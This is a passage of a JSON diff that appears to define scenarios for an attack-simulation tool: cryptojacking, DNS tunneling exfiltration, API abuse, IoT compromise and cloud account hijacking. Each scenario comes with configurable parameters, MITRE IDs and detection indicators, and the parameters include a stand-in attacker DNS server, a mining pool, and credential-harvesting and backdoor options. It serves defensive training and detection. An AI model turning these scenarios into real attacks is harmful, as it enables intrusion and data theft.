+      "typical_duration_seconds": 120,
+      "detection_difficulty": "hard",
+      "user_configurable_parameters": {
+        "compromise_point": {
+          "type": "select",
+          "label": "Compromise Point",
+          "options": [
+            "Software Update",
+            "Third-Party Library",
+            "Hardware Component",
+            "Cloud Service Provider",
+            "Managed Service Provider"
+          ],
+          "default": "Software Update"
+        },
+        "affected_nodes": {
+          "type": "node_selector",
+          "label": "Affected Systems",
+          "multiple": true,
+          "required": true
+        },
+        "malicious_component": {
+          "type": "select",
+          "label": "Malicious Component Type",
+          "options": [
+            "Backdoored Update",
+            "Trojanized Library",
+            "Compromised Certificate",
+            "Malicious Driver",
+            "Infected Installer"
+          ],
+          "default": "Backdoored Update"
+        },
+        "vendor_name": {
+          "type": "text",
+          "label": "Compromised Vendor",
+          "default": "TrustedSoftware Inc."
+        },
+        "spread_mechanism": {
+          "type": "select",
+          "label": "Spread Mechanism",
+          "options": ["Automatic Updates", "Manual Installation", "Dependency Chain", "Plugin/Extension"],
+          "default": "Automatic Updates"
+        }
+      },
+      "attack_pattern": {
+        "stages": [
+          {
+            "stage": 1,
+            "name": "Malicious Update Distribution",
+            "events": [
+              {
+                "event_type": "supply_chain_compromise",
+                "detection_indicators": {
+                  "unexpected_certificate": true,
+                  "hash_mismatch": true,
+                  "suspicious_code_signature": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 2,
+            "name": "Installation",
+            "events": [
+              {
+                "event_type": "malicious_install",
+                "detection_indicators": {
+                  "unusual_installation_behavior": true,
+                  "unexpected_network_connections": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 3,
+            "name": "Activation",
+            "events": [
+              {
+                "event_type": "backdoor_activation",
+                "detection_indicators": {
+                  "c2_communication": true,
+                  "persistent_backdoor": true
+                }
+              }
+            ]
+          }
+        ]
+      },
+      "architecture_vulnerabilities": {
+        "no_software_verification": true,
+        "automatic_updates_enabled": true,
+        "no_vendor_security_assessment": true,
+        "weak_third_party_oversight": true
+      }
+    },
+    {
+      "attack_id": "ATK016",
+      "attack_name": "Cryptojacking",
+      "category": "impact",
+      "difficulty": "medium",
+      "mitre_attack_id": "T1496",
+      "description": "Unauthorized use of computing resources to mine cryptocurrency",
+      "typical_duration_seconds": 600,
+      "detection_difficulty": "medium",
+      "user_configurable_parameters": {
+        "target_node": {
+          "type": "node_selector",
+          "label": "Target System",
+          "required": true
+        },
+        "infection_vector": {
+          "type": "select",
+          "label": "Infection Method",
+          "options": [
+            "Malicious Website (Drive-by)",
+            "Browser Extension",
+            "Compromised Software",
+            "Phishing Email",
+            "Exploited Vulnerability"
+          ],
+          "default": "Malicious Website (Drive-by)"
+        },
+        "cryptocurrency": {
+          "type": "select",
+          "label": "Target Cryptocurrency",
+          "options": ["Monero (XMR)", "Bitcoin", "Ethereum", "Other"],
+          "default": "Monero (XMR)"
+        },
+        "cpu_usage_percent": {
+          "type": "slider",
+          "label": "CPU Usage %",
+          "default": 80,
+          "min": 10,
+          "max": 100,
+          "description": "Percentage of CPU dedicated to mining"
+        },
+        "persistence": {
+          "type": "boolean",
+          "label": "Persistent Mining",
+          "default": true,
+          "description": "Continues after browser/app closure"
+        },
+        "mining_pool": {
+          "type": "text",
+          "label": "Mining Pool Address",
+          "default": "pool.minero.com:3333"
+        }
+      },
+      "attack_pattern": {
+        "stages": [
+          {
+            "stage": 1,
+            "name": "Miner Installation",
+            "events": [
+              {
+                "event_type": "cryptominer_installation",
+                "detection_indicators": {
+                  "suspicious_script_execution": true,
+                  "mining_library_loaded": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 2,
+            "name": "Mining Operation",
+            "events": [
+              {
+                "event_type": "cryptocurrency_mining",
+                "detection_indicators": {
+                  "high_cpu_usage": true,
+                  "mining_pool_connection": true,
+                  "elevated_temperature": true,
+                  "performance_degradation": true
+                }
+              }
+            ]
+          }
+        ]
+      },
+      "architecture_vulnerabilities": {
+        "no_process_monitoring": true,
+        "no_script_blocking": true,
+        "weak_endpoint_protection": true,
+        "no_network_anomaly_detection": true
+      }
+    },
+    {
+      "attack_id": "ATK017",
+      "attack_name": "DNS Tunneling",
+      "category": "exfiltration",
+      "difficulty": "hard",
+      "mitre_attack_id": "T1071.004",
+      "description": "Uses DNS queries to exfiltrate data or establish C2 channel",
+      "typical_duration_seconds": 180,
+      "detection_difficulty": "hard",
+      "user_configurable_parameters": {
+        "source_node": {
+          "type": "node_selector",
+          "label": "Compromised System",
+          "required": true
+        },
+        "tunneling_purpose": {
+          "type": "select",
+          "label": "Purpose",
+          "options": [
+            "Data Exfiltration",
+            "C2 Communication",
+            "Bypass Firewall",
+            "All of Above"
+          ],
+          "default": "Data Exfiltration"
+        },
+        "dns_server": {
+          "type": "text",
+          "label": "Attacker DNS Server",
+          "default": "ns1.attacker-domain.com"
+        },
+        "encoding_method": {
+          "type": "select",
+          "label": "Encoding Method",
+          "options": ["Base64", "Hex", "Custom", "None"],
+          "default": "Base64"
+        },
+        "query_rate": {
+          "type": "number",
+          "label": "Queries Per Minute",
+          "default": 30,
+          "min": 1,
+          "max": 1000
+        },
+        "data_volume_mb": {
+          "type": "number",
+          "label": "Data to Exfiltrate (MB)",
+          "default": 50,
+          "min": 1,
+          "max": 500
+        }
+      },
+      "attack_pattern": {
+        "stages": [
+          {
+            "stage": 1,
+            "name": "Tunnel Establishment",
+            "events": [
+              {
+                "event_type": "dns_tunnel_setup",
+                "detection_indicators": {
+                  "unusual_dns_queries": true,
+                  "long_subdomain_names": true,
+                  "high_dns_query_rate": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 2,
+            "name": "Data Transfer",
+            "events": [
+              {
+                "event_type": "dns_data_exfiltration",
+                "detection_indicators": {
+                  "encoded_dns_queries": true,
+                  "suspicious_domain_pattern": true,
+                  "unusual_query_types": true
+                }
+              }
+            ]
+          }
+        ]
+      },
+      "architecture_vulnerabilities": {
+        "no_dns_filtering": true,
+        "no_dns_monitoring": true,
+        "allows_all_dns_queries": true,
+        "no_query_length_limits": true
+      }
+    },
+    {
+      "attack_id": "ATK018",
+      "attack_name": "API Abuse",
+      "category": "initial_access",
+      "difficulty": "medium",
+      "mitre_attack_id": "T1190",
+      "description": "Exploits poorly secured or misconfigured APIs",
+      "typical_duration_seconds": 60,
+      "detection_difficulty": "medium",
+      "user_configurable_parameters": {
+        "target_node": {
+          "type": "node_selector",
+          "label": "API Server",
+          "filter": "type:api_server,type:web_server",
+          "required": true
+        },
+        "attack_type": {
+          "type": "select",
+          "label": "API Attack Type",
+          "options": [
+            "Broken Authentication",
+            "Excessive Data Exposure",
+            "Rate Limit Bypass",
+            "Injection Attack",
+            "Broken Object Level Authorization",
+            "Mass Assignment"
+          ],
+          "default": "Broken Object Level Authorization"
+        },
+        "api_endpoint": {
+          "type": "text",
+          "label": "Target Endpoint",
+          "default": "/api/v1/users/{id}"
+        },
+        "authentication_method": {
+          "type": "select",
+          "label": "Auth Method",
+          "options": ["API Key", "JWT Token", "OAuth", "Basic Auth", "None"],
+          "default": "API Key"
+        },
+        "requests_per_second": {
+          "type": "number",
+          "label": "Request Rate",
+          "default": 100,
+          "min": 1,
+          "max": 10000
+        },
+        "exploit_goal": {
+          "type": "select",
+          "label": "Attack Goal",
+          "options": [
+            "Data Extraction",
+            "Unauthorized Access",
+            "Service Disruption",
+            "Privilege Escalation"
+          ],
+          "default": "Data Extraction"
+        }
+      },
+      "attack_pattern": {
+        "stages": [
+          {
+            "stage": 1,
+            "name": "API Enumeration",
+            "events": [
+              {
+                "event_type": "api_reconnaissance",
+                "detection_indicators": {
+                  "endpoint_scanning": true,
+                  "parameter_fuzzing": true,
+                  "documentation_access": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 2,
+            "name": "Exploitation",
+            "events": [
+              {
+                "event_type": "api_abuse",
+                "detection_indicators": {
+                  "authorization_bypass": true,
+                  "excessive_requests": true,
+                  "abnormal_parameters": true
+                }
+              }
+            ]
+          }
+        ]
+      },
+      "architecture_vulnerabilities": {
+        "no_api_gateway": true,
+        "weak_authentication": true,
+        "no_rate_limiting": true,
+        "excessive_data_exposure": true,
+        "no_input_validation": true
+      }
+    },
+    {
+      "attack_id": "ATK019",
+      "attack_name": "IoT Device Compromise",
+      "category": "initial_access",
+      "difficulty": "medium",
+      "mitre_attack_id": "T1200",
+      "description": "Exploits vulnerabilities in Internet of Things devices",
+      "typical_duration_seconds": 90,
+      "detection_difficulty": "medium",
+      "user_configurable_parameters": {
+        "target_device": {
+          "type": "node_selector",
+          "label": "IoT Device",
+          "filter": "type:iot_device",
+          "required": true
+        },
+        "device_type": {
+          "type": "select",
+          "label": "Device Type",
+          "options": [
+            "IP Camera",
+            "Smart Thermostat",
+            "Smart Lock",
+            "Industrial Sensor",
+            "Medical Device",
+            "Network Printer",
+            "Smart TV"
+          ],
+          "default": "IP Camera"
+        },
+        "exploit_method": {
+          "type": "select",
+          "label": "Exploit Method",
+          "options": [
+            "Default Credentials",
+            "Firmware Vulnerability",
+            "Weak Encryption",
+            "Unpatched CVE",
+            "Exposed Admin Interface"
+          ],
+          "default": "Default Credentials"
+        },
+        "attack_goal": {
+          "type": "select",
+          "label": "Attack Objective",
+          "options": [
+            "Network Pivot Point",
+            "Botnet Recruitment",
+            "Surveillance",
+            "Data Theft",
+            "Denial of Service"
+          ],
+          "default": "Network Pivot Point"
+        },
+        "post_exploit": {
+          "type": "multiselect",
+          "label": "Post-Exploitation Actions",
+          "options": [
+            "Install Backdoor",
+            "Network Scanning",
+            "Credential Harvesting",
+            "Firmware Modification"
+          ],
+          "default": ["Install Backdoor", "Network Scanning"]
+        }
+      },
+      "attack_pattern": {
+        "stages": [
+          {
+            "stage": 1,
+            "name": "Device Discovery",
+            "events": [
+              {
+                "event_type": "iot_scanning",
+                "detection_indicators": {
+                  "iot_port_scanning": true,
+                  "device_fingerprinting": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 2,
+            "name": "Device Compromise",
+            "events": [
+              {
+                "event_type": "iot_exploitation",
+                "detection_indicators": {
+                  "default_credential_usage": true,
+                  "firmware_modification": true,
+                  "unauthorized_access": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 3,
+            "name": "Lateral Movement",
+            "events": [
+              {
+                "event_type": "iot_pivot",
+                "detection_indicators": {
+                  "unusual_iot_traffic": true,
+                  "internal_scanning_from_iot": true
+                }
+              }
+            ]
+          }
+        ]
+      },
+      "architecture_vulnerabilities": {
+        "default_credentials": true,
+        "no_iot_segmentation": true,
+        "unpatched_firmware": true,
+        "weak_encryption": true,
+        "no_iot_monitoring": true
+      }
+    },
+    {
+      "attack_id": "ATK020",
+      "attack_name": "Cloud Account Hijacking",
+      "category": "credential_access",
+      "difficulty": "medium",
+      "mitre_attack_id": "T1078.004",
+      "description": "Compromises cloud service accounts through various methods",
+      "typical_duration_seconds": 120,
+      "detection_difficulty": "medium",
+      "user_configurable_parameters": {
+        "target_cloud_service": {
+          "type": "select",
+          "label": "Cloud Service",
+          "options": [
+            "AWS",
+            "Microsoft Azure",
+            "Google Cloud Platform",
+            "Office 365",
+            "Salesforce",
+            "Other SaaS"
+          ],
+          "default": "AWS"
+        },
+        "compromise_method": {
+          "type": "select",
+          "label": "Compromise Method",
+          "options": [
+            "Phished Credentials",
+            "Stolen API Keys",
+            "Session Hijacking",
+            "Brute Force",
+            "Credential Stuffing",
+            "OAuth Token Theft"
+          ],
+          "default": "Phished Credentials"
+        },
+        "account_type": {
+          "type": "select",
+          "label": "Account Type",
+          "options": ["User Account", "Service Account", "Admin Account", "Root Account"],
+          "default": "User Account"
+        },
+        "attacker_actions": {
+          "type": "multiselect",
+          "label": "Post-Compromise Actions",
+          "options": [
+            "Data Access",
+            "Resource Provisioning",
+            "Privilege Escalation",
+            "Backdoor Creation",
+            "Crypto Mining",
+            "Data Exfiltration"
+          ],
+          "default": ["Data Access", "Backdoor Creation"]
+        },
+        "geographic_anomaly": {
+          "type": "boolean",
+          "label": "Login from Unusual Location",
+          "default": true
+        },
+        "mfa_bypass": {
+          "type": "select",
+          "label": "MFA Bypass Method",
+          "options": ["No MFA Enabled", "MFA Fatigue", "Session Cookie Theft", "N/A"],
+          "default": "No MFA Enabled"
+        }
+      },
+      "attack_pattern": {
+        "stages": [
+          {
+            "stage": 1,
+            "name": "Account Access",
+            "events": [
+              {
+                "event_type": "cloud_login",
+                "detection_indicators": {
+                  "unusual_login_location": true,
+                  "impossible_travel": true,
+                  "new_device_login": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 2,
+            "name": "Reconnaissance",
+            "events": [
+              {
+                "event_type": "cloud_enumeration",
+                "detection_indicators": {
+                  "rapid_api_calls": true,
+                  "permission_enumeration": true,
+                  "resource_discovery": true
+                }
+              }
+            ]
+          },
+          {
+            "stage": 3,
+            "name": "Malicious Activity",
+            "events": [
+              {
+                "event_type": "unauthorized_cloud_activity",
+                "detection_indicators": {
+                  "unusual_resource_creation": true,
+                  "data_download_spike": true,
+                  "privilege_changes": true,
+                  "backdoor_user_creation": true
+                }
+              }
+            ]
+          }
+        ]
+      },
+      "architecture_vulnerabilities": {
+        "no_mfa": true,
+        "weak_password_policy": true,
+        "no_conditional_access": true,
+        "excessive_permissions": true,
+        "no_cloud_security_monitoring": true,
+        "no_api_logging": true
+      }
+    }
+  ]
+}
